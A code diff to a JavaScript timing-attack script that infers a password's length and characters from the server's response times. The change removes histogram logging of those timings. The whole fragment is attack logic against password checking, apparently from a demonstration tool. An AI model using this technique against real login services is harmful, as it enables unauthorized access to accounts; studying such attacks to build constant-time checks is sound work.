@@ -27,14 +27,12 @@ function timedRequest(params, callback) {
     })
 }
 
-function tryLength(password, time, responseTimes, callback) {
+function tryLength(password, time, callback) {
     timedRequest(getParams(password), function(err, res, body) {
-        responseTimes[password.length] = res.time;
         if (res.time > time) {
-            console.log(histogram(responseTimes));
             return callback(password, res.time)
         }
-        tryLength(password + 'a', res.time, responseTimes, callback)
+        tryLength(password + 'a', res.time, callback)
     })
 }
 
@@ -67,7 +65,7 @@ function tryPassword(password, pos, last, time, responseTimes, callback) {
     })
 }
 
-tryLength('', 50, { }, function(password, last) {
+tryLength('', 50, function(password, last) {
     console.log("I've found the length of the password! It's " + password.length + " characters long.")
     tryPassword(password, 0, last, 50, { }, function(password, error) {
         if (error) {
